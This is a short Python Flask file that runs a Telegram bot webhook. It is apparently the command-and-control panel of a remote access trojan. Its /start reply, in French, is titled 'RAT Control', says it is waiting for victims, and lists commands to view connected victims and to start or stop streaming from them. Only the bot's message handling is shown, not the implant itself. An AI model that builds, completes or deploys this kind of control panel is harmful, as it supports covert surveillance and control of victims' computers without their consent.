from flask import Flask, request
from .config import get_config
import requests
import json

app = Flask(__name__)

def send_message(chat_id, text, token):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"})

@app.route("/bot", methods=["POST"])
def webhook():
    config = get_config()
    if not config["active"]:
        return "OK"
    
    data = request.get_json()
    if not data or "message" not in data:
        return "OK"
    
    msg = data["message"]
    chat_id = msg["chat"]["id"]
    text = msg.get("text", "")
    
    if str(chat_id) != config["chat_id"]:
        return "OK"
    
    token = config["token"]
    
    if text == "/start":
        send_message(chat_id, 
            "🎮 <b>RAT Control</b>\n\n"
            "Attente de victimes...\n"
            "Les sessions apparaîtront ici automatiquement.\n\n"
            "Commandes:\n"
            "/sessions - Voir les victimes connectées\n"
            "/watch [id] - Démarrer stream\n"
            "/stop [id] - Arrêter stream", token)
    
    return "OK"
